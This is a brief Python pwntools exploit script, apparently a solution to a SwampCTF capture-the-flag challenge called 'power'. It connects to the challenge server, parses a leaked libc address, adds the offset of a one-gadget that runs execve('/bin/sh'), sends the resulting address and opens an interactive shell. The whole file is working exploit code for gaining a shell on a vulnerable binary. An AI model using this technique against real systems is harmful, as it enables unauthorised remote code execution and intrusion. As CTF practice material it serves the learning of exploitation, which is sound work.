from pwn import *

def main():
	p = remote("chal1.swampctf.com", 1999)
	#p = process("./power")
	libc = ELF("libc.so.6")
	p.recvuntil("):")
	p.sendline("yes")
	a = p.recvuntil("Word:").split("[")[1].split("]")[0]
	addr = int(a[19:], 16)
	# 0x45216 execve("/bin/sh", rsp+0x30, environ)
	offset = 0x45216 - libc.symbols['system']
	p.sendline(p64(addr + offset))
	p.interactive()

if __name__ == "__main__":
	main()
